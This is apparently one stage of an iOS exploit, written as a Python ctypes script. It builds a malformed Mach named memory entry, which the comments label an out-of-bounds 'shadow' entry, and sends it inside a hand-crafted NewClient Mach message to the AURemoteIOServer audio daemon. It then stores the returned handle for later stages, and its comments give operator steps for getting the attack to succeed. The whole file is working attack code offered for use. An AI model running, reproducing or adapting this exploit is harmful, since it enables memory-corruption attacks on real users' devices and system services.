import builtins as _bi
if not hasattr(_bi, '_rh_state'): _bi._rh_state = {}
_rh_state = _bi._rh_state
def _rh_store(**kw): _bi._rh_state.update(kw); [print(f"[rh] stored {k}={v!r}") for k, v in kw.items()]

import ctypes as C, struct

# BEFORE RUNNING:
#   1. Play a short audio clip on the iPhone — this pre-launches AURemoteIOServer so
#      bootstrap_look_up below doesn't trigger a fresh launch (big memory spike).
#   2. Watch for "free_mb=" in the output; abort and retry if it prints < 150.

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype = C.c_uint32
L.mach_host_self.restype = C.c_uint32
t = L.mach_task_self()

# === Memory gate (must run before bootstrap_look_up which triggers server launch) ===
L.host_statistics64.restype = C.c_int
L.host_statistics64.argtypes = [C.c_uint32, C.c_int, C.c_void_p, C.POINTER(C.c_uint32)]
vmstat = (C.c_uint32 * 38)()
cnt = C.c_uint32(38)
L.host_statistics64(L.mach_host_self(), 4, vmstat, C.byref(cnt))  # HOST_VM_INFO64=4
free_mb = vmstat[0] * 0x4000 // (1024 * 1024)
print(f"free_mb={free_mb}")
if free_mb < 150:
    print("BAIL: < 150 MB free. Play audio on iPhone first, then retry.")
    raise RuntimeError("low memory")

M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int, C.POINTER(C.c_uint32), C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64, C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]
L.mach_vm_allocate.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]

# === Build shadow named entry (OOB child) ===
a = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
print(f"alloc kr={kr} va={hex(a.value)}")
if kr != 0: raise RuntimeError(f"mach_vm_allocate failed: {kr:#x}")

p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
print(f"parent_ne kr={kr}")
if kr != 0: raise RuntimeError(f"parent mach_make_memory_entry_64 failed: {kr:#x}")

c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
print(f"child_ne kr={kr}")
if kr != 0: raise RuntimeError(f"child mach_make_memory_entry_64 failed: {kr:#x}")

m = C.c_uint64(0)
kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
print(f"map_child kr={kr} va={hex(m.value)}")
if kr != 0: raise RuntimeError(f"mach_vm_map failed: {kr:#x}")

shadow_ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(shadow_ne), 0)
print(f"shadow_ne kr={kr} ne={shadow_ne.value}")
if kr != 0: raise RuntimeError(f"shadow mach_make_memory_entry_64 failed: {kr:#x}")

# === AURemoteIOServer lookup + NewClient ===
L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype = C.c_int32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype = C.c_int32
L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                        C.c_uint32, C.c_uint32, C.c_uint32]

bs = C.c_uint32.in_dll(L, "bootstrap_port").value
print(f"bootstrap_port={bs}")

# Keep svc in builtins so daemon thread can't write to freed memory if it outlives this script
import builtins as _bi2, threading
_bi2._rh_svc = C.c_uint32(0)
_lookup_result = [None]
def _do_lookup():
    kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(_bi2._rh_svc))
    _lookup_result[0] = kr
_lt = threading.Thread(target=_do_lookup, daemon=True)
_lt.start(); _lt.join(timeout=3)
if _lookup_result[0] is None:
    print("BAIL: bootstrap_look_up hung (3s) — AURemoteIOServer not running.")
    print("  → Play audio on the iPhone (Music/Podcasts), let it play 2s, then retry.")
    raise RuntimeError("bootstrap_look_up timeout")
kr = _lookup_result[0]
svc = _bi2._rh_svc
print(f"svc_lookup kr={kr} port={svc.value}")
if kr != 0 or svc.value == 0: raise RuntimeError(f"bootstrap_look_up failed: kr={kr:#x} port={svc.value}")

COMPLEX = 0x80000000
SO_BITS = (0x15 << 8) | 0x13  # MAKE_SEND_ONCE (local/reply) | COPY_SEND (remote)
CS_BITS = COMPLEX | SO_BITS

rp = L.mach_reply_port()
buf = bytearray(0x200)
struct.pack_into('<IIIIII', buf, 0x00, CS_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
struct.pack_into('<I', buf, 0x18, 1)  # descriptor_count=1
struct.pack_into('<IIHBB', buf, 0x1c, shadow_ne.value, 0, 0, 17, 0)  # PORT descriptor, MOVE_SEND
struct.pack_into('<II', buf, 0x34, 0, 1)  # client_type=0, session_id=1 (non-zero!)
buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
print(f"sending NewClient ne={shadow_ne.value} ...")
kr = L.mach_msg(buf_c, 0x113, 0x3c, len(buf), rp, 8000, 0)  # SEND|RCV|SEND_TIMEOUT|RCV_TIMEOUT
print(f"mach_msg kr={kr:#010x}")
if kr != 0:
    print("FAILED - if 0x10004003 (TIMEOUT): server not responding; play audio and retry")
    raise RuntimeError(f"mach_msg NewClient failed: {kr:#010x}")

nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
print(f"ret={nc_ret:#010x} handle={nc_hndl:#x}")
if nc_ret != 0:
    print(f"NewClient error: {nc_ret:#010x}")
    raise RuntimeError(f"NewClient returned error: {nc_ret:#010x}")

print(f"nc_hndl = {nc_hndl:#x}")
_rh_store(nc_hndl=nc_hndl, svc_port=svc.value)
